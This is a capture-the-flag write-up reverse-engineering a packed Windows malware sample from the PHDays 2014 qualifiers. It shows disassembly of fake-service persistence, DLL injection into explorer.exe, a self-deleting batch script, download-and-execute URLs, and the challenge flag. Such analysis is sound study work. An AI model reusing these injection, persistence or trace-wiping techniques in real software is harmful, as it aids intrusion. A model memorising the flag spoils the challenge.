## PHDays Quals CTF 2014 - MyFavoriteMalware (RE 4000)
##### 25-27/01/2014 (48 hr)
___

### Description: 

We have found an unknown malware sample in our corporate network. It could be related to Detcelfer
incident. You need to make a research.

archive pass: infected
___

### Solution

Binary is packed using UPX v2.90. However, if we download the right version and try to decompress 
it, we get the following error:
```
CantUnpackException: file is modified/hacked/protected; take care!!!
```

Ok not a big deal. If we take a look at the Control Flow Graph (CFG) of the binary, there's a node
at the bottom that ends with an indirect jump:
```Assembly
UPX1:0043BDF9         sub     esp, 0FFFFFF80h
UPX1:0043BDFC         jmp     near ptr loc_4044D1
UPX1:0043BDFC start   endp ; sp-analysis failed
UPX1:0043BDFC
``` 

(to keep the addresses consistent, we rebase program at address `0x400000`).


`loc_4044D1` is buffer in a RWX section. So, we set a breakpoint at `0x0043BDFC` and we run the 
program. That way, we simply let program unpack itself. In the unpacked code, there are many calls 
to the Windows API:
```Assembly
UPX0:00408D49 call    off_40D138
```

This offsets points to a GOT-like table:
```Assembly
UPX0:0040D138 off_40D138  dd offset kernel32_GetSystemTimeAsFileTime
```

To make code more readable, we rename all functions from that table, using the *rename.idc* script.


Unpacked code starts from `0x004044D1`. Function `sub_408D12` doesn't seems to make anything 
useful. When malware starts it shows a message:
```Assembly
UPX0:004011F0 entry_4011F0 proc near
UPX0:004011F0
UPX0:004011F0 var_4   = dword ptr -4
UPX0:004011F0
UPX0:004011F0         push    ebp
UPX0:004011F1         mov     ebp, esp
UPX0:004011F3         push    ecx
UPX0:004011F4         push    34h
UPX0:004011F6         push    offset aAttentionLicen  ; "Attention! License Agreement!"
UPX0:004011FB         push    offset aAttentionThisP  ; "Attention!!!\r\n\r\nThis program can HA"...
UPX0:00401200         push    0
UPX0:00401202         call    user32_MessageBoxA
UPX0:00401208         cmp     eax, 6                  ; IDYES == 6
UPX0:0040120B         jz      short YES_401218
UPX0:0040120D         mov     eax, 1                  ; IDNO == 7
UPX0:00401212         mov     esp, ebp
UPX0:00401214         pop     ebp
UPX0:00401215         retn    10h
UPX0:00401218 ; ---------------------------------------------------------------------------
UPX0:00401218
UPX0:00401218 YES_401218:                             ; CODE XREF: entry_4011F0+1Bj
UPX0:00401218         push    esi
UPX0:00401219         lea     ecx, [ebp+var_4]
UPX0:0040121C         mov     [ebp+var_4], 0
UPX0:00401223         call    start_402BE0
UPX0:00401228         mov     esi, [ebp+var_4]
UPX0:0040122B         test    esi, esi
UPX0:0040122D         jz      short loc_40123D
UPX0:0040122F         push    esi
UPX0:00401230         call    kernel32_ReleaseMutex
UPX0:00401236         push    esi
UPX0:00401237         call    kernel32_CloseHandle
UPX0:0040123D
UPX0:0040123D loc_40123D:                             ; CODE XREF: entry_4011F0+3Dj
UPX0:0040123D         xor     eax, eax
UPX0:0040123F         pop     esi
UPX0:00401240         mov     esp, ebp
UPX0:00401242         pop     ebp
UPX0:00401243         retn    10h
UPX0:00401243 entry_4011F0 endp
```

If "Yes" is pressed, then function `start_402BE0` is executed:
```Assembly
UPX0:00402C15 loc_402C15:                             ; CODE XREF: start_402BE0+2Cj
UPX0:00402C15         push    offset aNtdll_dll       ; "ntdll.dll"
UPX0:00402C1A         call    kernel32_LoadLibraryW
UPX0:00402C20         test    eax, eax
UPX0:00402C22         jz      short ERROR_402C0E
UPX0:00402C24         push    offset aRtladjustprivi  ; "RtlAdjustPrivilege"
UPX0:00402C29         push    eax
UPX0:00402C2A         call    off_40D07C
UPX0:00402C30         test    eax, eax
UPX0:00402C32         jz      short ERROR_402C0E
UPX0:00402C34         lea     ecx, [ebp+var_1]
UPX0:00402C37         push    ecx
UPX0:00402C38         push    0
UPX0:00402C3A         push    1
UPX0:00402C3C         push    14h
UPX0:00402C3E         mov     [ebp+var_1], 0
UPX0:00402C42         call    eax                     ; RtlAdjustPrivilege
UPX0:00402C44         test    eax, eax
UPX0:00402C46         js      short ERROR_402C0E
UPX0:00402C48         mov     ecx, esi
UPX0:00402C4A         call    write_secret_4022A0
UPX0:00402C4F         test    eax, eax
UPX0:00402C51         jz      short ERROR_402C0E
UPX0:00402C53         lea     edx, [ebp+var_8]
UPX0:00402C56         push    edx
UPX0:00402C57         mov     ecx, esi
UPX0:00402C59         mov     [ebp+var_8], 0
UPX0:00402C60         call    install_service_402950
UPX0:00402C65         test    eax, eax
UPX0:00402C67         jz      short ERROR_402C0E
UPX0:00402C69         mov     ecx, esi
UPX0:00402C6B         call    write_mswow_dll_402640
UPX0:00402C70         test    eax, eax
UPX0:00402C72         jz      short ERROR_402C0E
UPX0:00402C74         mov     ecx, esi
UPX0:00402C76         call    inject_dll_4012C0
UPX0:00402C7B         test    eax, eax
UPX0:00402C7D         jz      short ERROR_402C0E
UPX0:00402C7F         cmp     [ebp+var_8], 0
UPX0:00402C83         jz      short loc_402C8C
UPX0:00402C85         mov     ecx, esi
UPX0:00402C87         call    suicide_4023D0
```

As you can see from here, there are some interesting functions that are called in order (if any
of them fails, function returns). `write_secret_4022A0` creates a file `C:\Windows\install.ini` 
and writes some encrypted data in it (keep this in mind):
```
0040D310  62 16 2C E3 65 92 10 1E  23 96 6B 88 45 57 98 6F
0040D320  1A 3A 4C 30 65 1D 30 C6  41 94 44 D3 63 36 B7 3B
0040D330  52 9F EB 61 7D 2A EC 97  5C BA 00 53 92 69 61 E6
0040D340  E1 7C BC 1C 8E D0 8D 58  FE 1F 4C 1C 71 9B 0E 42
0040D350  A8 81 CC 76 1C CD 00 78  CF 85 21 94 47 96 4C CF
0040D360  8D 53 F2 0E E9 F7 42 BB  88 8C 64 84 0E 5C 72 45
0040D370  21 BF B2 37 06 0D 83 E0  28 34 FD F1 F6 F8 20 DF
0040D380  E3 E1 F8 0D A8 3D DF 3F  D3 91 AA A0 98 9F 6B A1
0040D390  F3 33 3F CD A0 D9 A3 A0  D3 FB F1 1B 72 02 D0 9B
0040D3A0  39 8D D6 A8 44 4A 74 1F  E5 7C AC 7F 7E 11 A8 CD
0040D3B0  3F 36 D5 B4 07 D2 F7 14  2B E0 79 1F FB 86 AC 95
```


`install_service_402950` copies the malware itself into `C:\Windows\SysWOW64\WindowsUpdater.exe`
and makes it a service (if it's not already a service):
```Assembly
....
UPX0:00402AD9         push    esi                     ; arg3: 0
UPX0:00402ADA         push    eax                     ; arg2: C:\Windows\SysWOW64\WindowsUpdater.exe
UPX0:00402ADB         lea     edx, [ebp+var_478]
UPX0:00402AE1         push    edx                     ; arg1: C:\Users\ispo\Desktop\myfavoritemalware.exe
UPX0:00402AE2         call    CopyFile_40D05C
UPX0:00402AE8         test    eax, eax
UPX0:00402AEA         jz      loc_402B83
UPX0:00402AF0         push    0F003Fh                 ; SC_MANAGER_ALL_ACCESS
UPX0:00402AF5         push    esi
UPX0:00402AF6         push    esi
UPX0:00402AF7         call    advapi32_OpenSCManagerW
UPX0:00402AFD         mov     edi, eax
UPX0:00402AFF         cmp     edi, esi
UPX0:00402B01         jz      short loc_402B7A
UPX0:00402B03         push    0F01FFh                 ; SERVICE_ALL_ACCESS
UPX0:00402B08         push    offset aWindowsupdat_0  ; "WindowsUpdater"
UPX0:00402B0D         push    edi
UPX0:00402B0E         call    advapi32_OpenServiceW
UPX0:00402B14         mov     ebx, advapi32_CloseServiceHandle
UPX0:00402B1A         cmp     eax, esi
UPX0:00402B1C         jz      short MAKE_SRV_402B21
UPX0:00402B1E         push    eax
UPX0:00402B1F         jmp     short SRV_OK_402B69
UPX0:00402B21 MAKE_SRV_402B21:                        ; CODE XREF: install_service_402950+1CCj
....
UPX0:00402B2D         push    esi
UPX0:00402B2E         push    esi
UPX0:00402B2F         push    esi
UPX0:00402B30         push    esi
UPX0:00402B31         push    esi
UPX0:00402B32         push    eax
UPX0:00402B33         push    esi
UPX0:00402B34         push    2                       ; SERVICE_AUTO_START
UPX0:00402B36         push    10h
UPX0:00402B38         push    0F01FFh
UPX0:00402B3D         push    offset aWindowsUpdater  ; "Windows Updater"
UPX0:00402B42         push    offset aWindowsupdat_0  ; "WindowsUpdates"
UPX0:00402B47         push    edi
UPX0:00402B48         call    advapi32_CreateService
UPX0:00402B4E         mov     esi, eax
UPX0:00402B50         test    esi, esi
UPX0:00402B52         jz      short loc_402B72
UPX0:00402B54         lea     eax, [ebp+var_14]
UPX0:00402B57         push    eax
UPX0:00402B58         push    1
UPX0:00402B5A         push    esi
UPX0:00402B5B         mov     [ebp+var_14], offset aWindowsUpdat_0 ; "Windows Updater keeps your Windows up t"...
UPX0:00402B62         call    advapi32_ChangeServiceConfig2W
UPX0:00402B68         push    esi
```


Then function `write_mswow_dll_402640` creates a dll file at `C:\Windows\SysWOW64\mswow64.dll`.
The dll is inside the malware binary (stored as a resource). Then `inject_dll_4012C0` is the
classic DLL Injection technique, where it injects some shellcode into the address space of 
`explorer.exe`:

```Assembly
....
UPX0:00401326         push    offset aExplorer_exe    ; "explorer.exe"
UPX0:0040132B         push    edx
UPX0:0040132C         call    sub_403804
UPX0:00401331         add     esp, 8
UPX0:00401334         test    eax, eax
UPX0:00401336         jnz     NOT_FOUND_4013E3
UPX0:0040133C         mov     eax, [ebp+var_238]
UPX0:00401342         push    eax                     ; _DWORD
UPX0:00401343         push    0                       ; _DWORD
UPX0:00401345         push    1FFFFFh                 ; _DWORD
UPX0:0040134A         call    kernel32_OpenProcess
UPX0:00401350         mov     esi, eax
UPX0:00401352         test    esi, esi
UPX0:00401354         jz      NOT_FOUND_4013E3
UPX0:0040135A         mov     ecx, [ebp+var_C]
UPX0:0040135D         mov     [ebp+var_10], 0
UPX0:00401364         call    sub_401250
UPX0:00401369         push    40h                     ; _DWORD
UPX0:0040136B         push    3000h                   ; _DWORD
UPX0:00401370         mov     ebx, eax
UPX0:00401372         push    ebx                     ; _DWORD
UPX0:00401373         push    0                       ; _DWORD
UPX0:00401375         push    esi                     ; _DWORD
UPX0:00401376         call    kernel32_VirtualAllocEx
UPX0:0040137C         mov     edi, eax
UPX0:0040137E         test    edi, edi
UPX0:00401380         jz      short ERROR_4013D3
UPX0:00401382         lea     ecx, [ebp+var_10]
UPX0:00401385         push    ecx                     ; _DWORD
UPX0:00401386         push    ebx                     ; _DWORD
UPX0:00401387         push    offset shellcode_401040 ; _DWORD
UPX0:0040138C         push    edi                     ; _DWORD
UPX0:0040138D         push    esi                     ; _DWORD
UPX0:0040138E         call    kernel32_WriteProcessMemory
UPX0:00401394         test    eax, eax
UPX0:00401396         jz      short ERROR_4013D3
UPX0:00401398         mov     edx, [ebp+var_C]
UPX0:0040139B         mov     eax, [edx]
UPX0:0040139D         push    eax                     ; _DWORD
UPX0:0040139E         mov     [ebp+var_14], 0
UPX0:004013A5         call    kernel32_ReleaseMutex
UPX0:004013AB         lea     ecx, [ebp+var_14]
UPX0:004013AE         push    ecx                     ; _DWORD
UPX0:004013AF         push    0                       ; _DWORD
UPX0:004013B1         push    0                       ; _DWORD
UPX0:004013B3         push    edi                     ; _DWORD
UPX0:004013B4         push    0                       ; _DWORD
UPX0:004013B6         push    0                       ; _DWORD
UPX0:004013B8         push    esi                     ; _DWORD
UPX0:004013B9         call    kernel32_CreateRemoteThread
UPX0:004013BF         test    eax, eax
UPX0:004013C1         jz      short ERROR_4013D3
....
```

The injected shellcode is this:
```Assembly
UPX0:00401040 shellcode_401040:                       ; DATA XREF: inject_dll_4012C0+C7o
....
UPX0:00401065         mov     dword ptr [ebp-30h], 64616F4Ch ; "LoadLibraryA"
UPX0:0040106C         mov     dword ptr [ebp-2Ch], 7262694Ch
UPX0:00401073         mov     dword ptr [ebp-28h], 41797261h
UPX0:0040107A         mov     [ebp-24h], bl
UPX0:0040107D         mov     dword ptr [ebp-40h], 50746547h ; "GetProcAddress"
UPX0:00401084         mov     dword ptr [ebp-3Ch], 41636F72h
UPX0:0040108B         mov     dword ptr [ebp-38h], 65726464h
UPX0:00401092         mov     word ptr [ebp-34h], 7373h
UPX0:00401098         mov     [ebp-32h], bl
UPX0:0040109B         mov     [ebp-10h], ecx
UPX0:0040109E         mov     [ebp-8], ebx
UPX0:004010A1         cmp     edi, ebx
UPX0:004010A3         jz      FAIL_4011AE
....
UPX0:00401179         mov     dword ptr [ebp-30h], 6F77736Dh ; "mswow64.dll"
UPX0:00401180         mov     dword ptr [ebp-2Ch], 2E343677h
UPX0:00401187         mov     dword ptr [ebp-28h], 6C6C64h
UPX0:0040118E         call    eax
UPX0:00401190         cmp     eax, ebx
UPX0:00401192         jz      short FAIL_4011AE
UPX0:00401194         lea     ecx, [ebp-20h]
UPX0:00401197         push    ecx
UPX0:00401198         push    eax
UPX0:00401199         mov     dword ptr [ebp-20h], 72617453h ; "Start"
UPX0:004011A0         mov     word ptr [ebp-1Ch], 74h
UPX0:004011A6         call    esi
UPX0:004011A8         cmp     eax, ebx
UPX0:004011AA         jz      short FAIL_4011AE
UPX0:004011AC         call    eax
UPX0:004011AE
UPX0:004011AE FAIL_4011AE:                            ; CODE XREF: UPX0:004010A3j
UPX0:004011AE                                         ; UPX0:004010C1j ...
UPX0:004011AE         nop
UPX0:004011AF         nop
....
```

From here we can see that `Start` function from `mswow64.dll` is invoked (remember this happens
inside `explorer.exe`).


Last but not least, `suicide_4023D0` is responsible for destroying any traces that the malware
left. So it creates a batch file with a random name under Temp directory 
`C:\Windows\Temp\uwfiio.bat` with the following contents:
```
@ECHO off
:Loop
DEL %1
IF EXIST %1 GOTO Loop
DEL %0
EXIT
```

And it calls `ShellExecuteW` with `C:\Users\ispo\Desktop\myfavoritemalware.exe` as an argument 
(i.e. it deletes the original binary).


#### Stage 2
In the next stage, we start from function `Start` in `mswow64.dll`. In this function there are also
many calls to the Windows API (exactly in the same way with the original binary). First we run
this command to organize the "Unknown" data into DWORDs:
```Python
for off in range(0, 0x15c, 4): MakeDword(off + 0x10000000)
```

and then we reuse our *rename.idc* script to make code more readable.

(to keep the addresses consistent, we rebase mswow64.dll at address `0x10000000`).



A quick look at the *strings*, reveals that *MD5* and *RC4* might be used somewhere, so we
keep this in mind:
```
.rdata:1000B430 aRc4PartOfOpens db 'RC4 part of OpenSSL 1.0.1e 11 Feb 2013',0
.rdata:1000B470 aMd5PartOfOpens db 'MD5 part of OpenSSL 1.0.1e 11 Feb 2013',0
```

The first interesting part in the code is this:
```Assembly
.text:1000121D loc_1000121D:                           ; CODE XREF: sub_100011B0+40j
.text:1000121D         push    0                       ; int
.text:1000121F         push    0                       ; int
.text:10001221         mov     ebx, 1
.text:10001226         push    offset sub_10001180     ; int
.text:1000122B         lea     ecx, [ebp+var_7C]       ; void *
.text:1000122E         mov     byte ptr [ebp+var_4], bl
.text:10001231         call    hash_ip_10002B80
.text:10001236         mov     byte ptr [ebp+var_4], 2
.text:1000123A         call    init_IPs_100010C0
.text:1000123F         push    eax
.text:10001240         lea     ecx, [ebp+var_7C]
.text:10001243         call    find_local_ip_100027C0
.text:10001248         push    offset key_stream_1000B220
.text:1000124D         lea     ecx, [ebp+var_7C]
.text:10001250         call    load_key_100024F0
.text:10001255         push    3458h
.text:1000125A         lea     ecx, [ebp+var_7C]
.text:1000125D         call    save_port_100024A0
.text:10001262         lea     ecx, [ebp+var_7C]
.text:10001265         call    loop_100028D0
```

The first function `hash_ip_10002B80` calculates the MD5 sum of the local IP. Then 
`init_IPs_100010C0`, creates a table with some IP addresses:
```Assembly
.text:100010C0 init_IPs_100010C0 proc near             ; CODE XREF: sub_100011B0+8Ap
.....
// allocate and bzero a buffer
.....
.text:100010EB loc_100010EB:                           ; CODE XREF: init_IPs_100010C0+27j
.text:100010EB         mov     dword ptr [eax], 0A003C71h
.text:100010F1         mov     dword ptr [eax+4], 0A006983h
.text:100010F8         mov     dword ptr [eax+8], 0A005877h
.text:100010FF         mov     dword ptr [eax+0Ch], 0A00494Ch
.text:10001106         mov     dword ptr [eax+10h], 0A001D2Bh
.text:1000110D         mov     dword ptr [eax+14h], 0A005029h
.text:10001114         mov     dword ptr [eax+18h], 0A000650h
.text:1000111B         mov     [eax+1Ch], ecx
.text:1000111E         retn
.text:1000111E init_IPs_100010C0 endp
```

We can see from here that there are 7 IP addresses (in big endian):
```
	[0]: 0A003C71 --> 113.60.0.10 
	[1]: 0A006983 --> 131.105.0.10 
	[2]: 0A005877 --> 119.88.0.10
	[3]: 0A00494C --> 76.73.0.10
	[4]: 0A001D2B --> 43.29.0.10
	[5]: 0A005029 --> 41.80.0.10
	[6]: 0A000650 --> 80.6.0.10
```


Function `find_local_ip_100027C0` checks whether local IP is in this table and if so, it 
returns the index in the table:
```Assembly
.text:10002800 loc_10002800:                           ; CODE XREF: sub_73C027C0+49j
.text:10002800         cmp     edx, [ecx+eax*4]        ; compare your IP w/ every IP on the table
.text:10002803         jz      short loc_1000280E
.text:10002805         inc     eax
.text:10002806         cmp     eax, [esi+0Ch]
.text:10002809         jb      short loc_73C02800
```


`load_key_100024F0` uses this index to load a constant 16 byte key stream. Each row corresponds to
a different key stream:
```
85 0F CD 38 57 DA DB 72  66 BF E4 68 AE DD E5 AA
83 76 01 E6 B7 6E E5 BF  9E E8 17 68 F3 4E AA 47
0B D9 79 85 BA C4 31 03  CD 75 15 9E C7 AE 9B 30
9F D3 56 1B 7A 74 68 D5  3F D5 A1 49 0C 75 CF 9A
45 BF 3C CF DD ED 23 CA  9B 35 0E F5 E8 AE 14 78
8D 44 B1 CF 4C FA 89 CA  8F 8E 9E F9 C8 1C 9A 90
E9 1F EC 44 69 61 C5 8E  1E 79 DA D6 1B 4C 4C 26
```


The final and most important function is `loop_100028D0`. It starts by setting up a server at
port `13400`. It uses `select()` to poll the socket for incoming connections. When a connection
arrives, it reads `20` bytes from it and it closes the socket. Then it calculates the following
20 byte value `V`:
```
	V = input[0:3] + MD5(++input[0] + MD5(ip))
``` 

This value is send to a new IP from the list. If the `i` is the index of the current IP in the 
table, then the next IP to send `V` will be `(i + 3) % 7`. Thus, the order of the IPs is: 
0, 3, 6, 2, 5, 1, 4.

When `V[0] == 7`, a decryption attempt is made. First the last 16 bytes of `V` are XORed with
the appropriate `key_stream` and then there's an indirect call:
```Assembly
.text:100029A7         call    eax
```

Which actually points to:
```Assembly
.text:10001180 ; int __cdecl next_stage_10001180(DWORD NumberOfBytesWritten)
.text:10001180 next_stage_10001180 proc near           ; DATA XREF: sub_100011B0+76o
.text:10001180
.text:10001180 NumberOfBytesWritten= dword ptr  8
.text:10001180
.text:10001180         push    ebp
.text:10001181         mov     ebp, esp
.text:10001183         mov     eax, [ebp+NumberOfBytesWritten]
.text:10001186         push    eax                     ; NumberOfBytesWritten
.text:10001187         mov     ecx, offset hObject
.text:1000118C         call    decr_advres_10001B30
.text:10001191         test    eax, eax
.text:10001193         jnz     short loc_10001199
.text:10001195         xor     al, al
.text:10001197         pop     ebp
.text:10001198         retn
.text:10001199 ; ---------------------------------------------------------------------------
.text:10001199
.text:10001199 loc_10001199:                           ; CODE XREF: next_stage_10001180+13j
.text:10001199         mov     ecx, offset hObject
.text:1000119E         call    load_advres_10001CC0
.text:100011A3         neg     eax
.text:100011A5         sbb     eax, eax
.text:100011A7         neg     eax
.text:100011A9         pop     ebp
.text:100011AA         retn
.text:100011AA next_stage_10001180 endp
```
 
`decr_advres_10001B30` loads `advres.dll` from a resource and then tries to decrypt it by using the
above value as a seed in the RC4 algorithm:
```Assembly
.text:10001BBF         push    ebx                     ; arg4: resource len
.text:10001BC0         push    eax                     ; arg3: resource
.text:10001BC1         mov     eax, [ebp+NumberOfBytesWritten]
.text:10001BC4         push    10h                     ; arg2: keylen
.text:10001BC6         push    eax                     ; arg1: key
.text:10001BC7         call    RC4_10001050
.text:10001BCC         mov     edi, eax
.text:10001BCE         add     esp, 10h
.text:10001BD1         cmp     byte ptr [edi], 4Dh     ; 'MZ' header?
.text:10001BD4         jnz     WRONG_DECR_10001C77
.text:10001BDA         cmp     byte ptr [edi+1], 5Ah
.text:10001BDE         jnz     WRONG_DECR_10001C77
```

 
If decryption is successful, the (decrypted) resource is written to the file `advres.dll`. Then
`load_advres_10001CC0` loads that DLL and invokes function `DownloadAndExec` with `install.ini`
as an argument:
```Assembly
.text:10001D75         lea     eax, [ebp+var_28]
.text:10001D78         push    eax                     ; arg1: C:\Windows\install.ini
.text:10001D79         call    esi                     ; DownloadAndExec()
.text:10001D7B         cmp     [ebp+var_14], 8
```


Our goal here, is decrypt `advres.dll`. All we have to do, is to simulate the way that `V` values
are generated and send across different IPs. `myfavoritemalware_crack.py` does this job and finds 
the RC4 key that is used to decrypt `advres.dll`. After running the crack, we get the RC4 key:
```
F2 2E 0D 1F 85 67 C6 A4 C8 88 75 4B 1B 46 10 E9
```

By using this key, we can successfully decrypt and analyze `advres.dll`.



#### Stage 3
In this stage `DownloadAndExec` from `advres.dll` is invoked. `DownloadAndExec` first calls
`decrypt_secret_2627C0`, where it reads `install.ini` and decrypts it. Although we don't know
the decryption algorithm, we can get the decrypted output:
```
file0:http://195.133.87.163/static/stuff/hoadneb.exe; 
file1:http://www.myfavoritemalware.com/files/prnvuag.exe; 
flag:6b87b043ab6953e99069703eaa6d54cb; 
```

After the decryption, these two executable files are downloaded and executed using `ShellExecuteW`.


### Stage 4
From these 2 files, `prnvuag.exe` is non-existing, and `hoadneb.exe` does nothing more than starting
the calculator and printing a message:
```Assembly
.text:00401000 sub_401000      proc near               ; CODE XREF: start+12Ap
.text:00401000         push    offset Command  ; "start calc"
.text:00401005         call    ds:system
.text:0040100B         add     esp, 4
.text:0040100E         push    0               ; uType
.text:00401010         push    offset Caption  ; "Evil"
.text:00401015         push    offset Text     ; "You've been PWNED, ha-ha! =D"
.text:0040101A         push    0               ; hWnd
.text:0040101C         call    ds:MessageBoxW
.text:00401022         xor     eax, eax
.text:00401024         retn    10h
.text:00401024 sub_401000      endp
```

So the flag for this challenge is `6b87b043ab6953e99069703eaa6d54cb`.
___
